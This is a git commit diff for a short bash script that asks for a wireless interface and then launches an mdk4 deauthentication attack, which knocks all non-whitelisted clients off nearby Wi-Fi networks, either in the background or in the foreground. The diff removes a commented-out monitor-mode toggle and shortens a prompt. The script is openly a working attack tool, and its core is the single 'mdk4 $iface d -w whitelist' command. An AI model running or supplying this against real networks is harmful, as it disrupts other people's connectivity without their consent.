66a2d026e62b0a4d0caceafc46aa8d015d828255
voldmort21 <38194695+voldmort21@users.noreply.github.com>
2021-10-10 12:15:41 -0400

    update d.sh

--- d.sh
+++ d.sh
@@ -1,3 +1,5 @@
+#!/usr/bin/bash
+
 # Just Running iwconfig 
 sudo iwconfig 
 
@@ -5,25 +7,8 @@ sudo iwconfig
 echo "iface : "
 read iface
 
-# Let User Choose Between Enabling Monitor Mode Or Disable it 
-#echo "U Wanna Enable Monitor Mode Or Disbale it ...  e (Enable ) / d (Disable)"
-#read ch
-
-# Doing What User Choosen Using A Switch 
-#case $ch in 
-#	"e")
-#             sudo ip link set $iface down
-#             sudo iw dev $iface set type monitor 
-#	;;
-#	
-#         "d")
-#	      sudo ip link set $iface down 
-#	      sudo iw dev $iface set type managed
-#	;;
-#esac
-
 # Asking User If whether To Deploy or no
-echo "U Wanna Deploy The Attack In The Background Or no ... -1 (Yes In Background) -2 (Yes But Not In Background)  -3 (no) "
+echo " 1- (Yes In Background) 2- (Yes But Not In Background)  3- (no) "
 read deploy
 
 if  [ $deploy -eq 1 ] 
@@ -39,4 +24,3 @@ echo "Deploying The Attack ..."
 sudo mdk4 $iface d -w whitelist 
 
 fi
-
